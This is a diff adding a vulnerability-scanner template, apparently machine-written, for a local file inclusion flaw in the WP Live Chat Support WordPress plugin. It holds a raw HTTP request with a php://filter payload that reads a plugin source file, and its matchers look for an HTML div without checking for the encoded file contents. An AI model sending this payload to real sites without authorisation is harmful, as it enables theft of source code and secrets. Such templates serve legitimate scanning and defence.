@@ -1,0 +1,32 @@
+id: wordpress-plugin-wp-live-chat-support-file-inclusion
+info:
+  name: WordPress Plugin WP Live Chat Support File Inclusion
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    WP Live Chat Support Plugin versions <= 9.4.2 are vulnerable to file inclusion, allowing attackers to read sensitive files.
+  tags:
+    - file-inclusion
+    - wordpress
+    - plugin
+  reference:
+    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wp-live-chat-support/3cx-live-chat-942-local-file-inclusion
+http:
+  - raw:
+      - |
+        GET /?path=php://filter/convert.base64-encode/resource=wp-content/plugins/wp-live-chat-support/includes/wplc_base_controller.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "id=\"wplc_wrapper\""
+      - type: regex
+        regex:
+          - '<div\s*id="wplc_wrapper"\s*>\s*(.+?)\s*<\s*/div>'
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '<div\s*id="wplc_wrapper"\s*>\s*(.+?)\s*<\s*/div>'
+        group: 1
